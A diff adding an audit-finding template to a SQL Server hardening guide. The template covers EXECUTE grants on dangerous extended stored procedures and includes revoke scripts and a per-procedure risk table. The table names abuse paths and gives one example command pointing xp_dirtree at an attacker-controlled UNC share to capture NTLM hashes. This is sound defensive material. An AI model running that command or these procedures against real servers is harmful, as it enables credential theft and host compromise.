@@ -1002,6 +1002,65 @@ WHERE pe.major_id IN (
 AND pe.state_desc = 'GRANT';
 ```
 
+#### Generic Finding — Excessive Permissions on Dangerous Extended Stored Procedures
+
+Use this finding when any of the above procedures have explicit GRANT permissions to non-sysadmin principals.
+
+```
+### Finding: EXECUTE Permissions Granted on Dangerous Extended Stored Procedures
+
+| Field | Detail |
+|---|---|
+| **Severity** | High |
+| **CIS Reference** | CIS SQL Server 2022 Benchmark 2.11, 2.12; DISA STIG V-213987 |
+| **Affected Instance** | ServerName\InstanceName |
+| **Current State** | Explicit EXECUTE permissions are granted to non-administrative principals on one or more dangerous extended stored procedures (e.g., xp_cmdshell, xp_regread, xp_regwrite, xp_dirtree, xp_servicecontrol, sp_OACreate, sp_OAMethod) |
+| **Evidence** | [Paste query output showing Procedure, Principal, permission_name, state_desc] |
+| **Expected State** | No explicit EXECUTE permissions should be granted on extended stored procedures that provide direct access to the operating system, file system, registry, or COM objects. Only members of the sysadmin fixed server role should be able to execute these procedures, and only when the underlying feature (e.g., xp_cmdshell) is temporarily enabled for a specific administrative task |
+| **Risk** | These procedures allow authenticated database users to interact directly with the host operating system. Depending on the procedure, an attacker or compromised account could: read and write registry keys (xp_regread, xp_regwrite, xp_regdeletekey) to modify SQL Server or OS configuration; execute arbitrary OS commands (xp_cmdshell) leading to full server compromise; enumerate file system paths and network shares (xp_dirtree, xp_subdirs, xp_availablemedia) for lateral movement and data discovery; control Windows services (xp_servicecontrol) to disable security tooling or stop audit services; instantiate and invoke COM objects (sp_OACreate, sp_OAMethod) to bypass SQL Server security boundaries and execute code in the OS context. Even read-only procedures such as xp_regread and xp_dirtree are dangerous — they enable reconnaissance of the host environment, credential harvesting from registry-stored secrets, and UNC path injection for NTLM relay attacks |
+| **Recommendation** | Revoke explicit EXECUTE permissions on all dangerous extended stored procedures for non-administrative principals. Where application functionality depends on these procedures, migrate to safer alternatives (e.g., CLR integration with strict security, application-layer file operations) and implement compensating controls such as SQL Server Audit logging on procedure execution |
+| **Remediation SQL** | See below |
+```
+
+```sql
+-- Revoke permissions (repeat for each principal and procedure from the evidence)
+REVOKE EXECUTE ON xp_regread TO [PrincipalName];
+REVOKE EXECUTE ON xp_regwrite TO [PrincipalName];
+REVOKE EXECUTE ON xp_regdeletekey TO [PrincipalName];
+REVOKE EXECUTE ON xp_regdeletevalue TO [PrincipalName];
+REVOKE EXECUTE ON xp_dirtree TO [PrincipalName];
+REVOKE EXECUTE ON xp_subdirs TO [PrincipalName];
+REVOKE EXECUTE ON xp_servicecontrol TO [PrincipalName];
+REVOKE EXECUTE ON xp_availablemedia TO [PrincipalName];
+REVOKE EXECUTE ON xp_enumdsn TO [PrincipalName];
+REVOKE EXECUTE ON xp_loginconfig TO [PrincipalName];
+REVOKE EXECUTE ON xp_makecab TO [PrincipalName];
+REVOKE EXECUTE ON xp_cmdshell TO [PrincipalName];
+REVOKE EXECUTE ON sp_OACreate TO [PrincipalName];
+REVOKE EXECUTE ON sp_OAMethod TO [PrincipalName];
+REVOKE EXECUTE ON sp_OADestroy TO [PrincipalName];
+```
+
+**Per-procedure risk reference:**
+
+| Procedure | Category | Why It Is Dangerous |
+|---|---|---|
+| `xp_cmdshell` | OS command execution | Executes arbitrary operating system commands as the SQL Server service account. Full host compromise if granted to a low-privilege user |
+| `xp_regread` | Registry read | Reads Windows registry keys. Can extract service account credentials, connection strings, software inventory, and security configuration |
+| `xp_regwrite` | Registry write | Writes to the Windows registry. Can modify SQL Server configuration, register malicious COM objects, tamper with security settings, or establish persistence |
+| `xp_regdeletekey` | Registry delete | Deletes registry keys. Can remove audit configuration, security software registration, or break services |
+| `xp_regdeletevalue` | Registry delete | Deletes individual registry values. Same risks as xp_regdeletekey at a more granular level |
+| `xp_dirtree` | File system enumeration | Lists directory contents on the server or across UNC paths. Enables file system reconnaissance and NTLM hash capture via UNC path injection (e.g., `xp_dirtree '\\attacker\share'`) |
+| `xp_subdirs` | File system enumeration | Lists subdirectories. Same reconnaissance and NTLM relay risks as xp_dirtree |
+| `xp_availablemedia` | File system enumeration | Lists available drives and media. Reveals storage layout for targeted data exfiltration |
+| `xp_enumdsn` | ODBC enumeration | Lists configured ODBC data sources. Reveals other database connections and potential lateral movement targets |
+| `xp_loginconfig` | Security configuration | Displays the login security configuration of the server. Reveals authentication mode and audit settings to an attacker |
+| `xp_makecab` | File system write | Creates compressed cabinet (.cab) files. Can be used to stage data for exfiltration or write files to disk |
+| `xp_servicecontrol` | Service management | Starts and stops Windows services. An attacker can disable antivirus, stop audit services, or shut down security monitoring |
+| `sp_OACreate` | COM object instantiation | Creates instances of COM objects on the server. Provides a code execution pathway outside SQL Server's security model |
+| `sp_OAMethod` | COM object method call | Invokes methods on COM objects. Combined with sp_OACreate, allows arbitrary code execution, file system access, and HTTP requests from the server |
+| `sp_OADestroy` | COM object cleanup | Destroys COM object instances. Typically granted alongside sp_OACreate and sp_OAMethod — revoke as a set |
+
 ### User Stored Procedures with Dynamic SQL
 
 ```sql
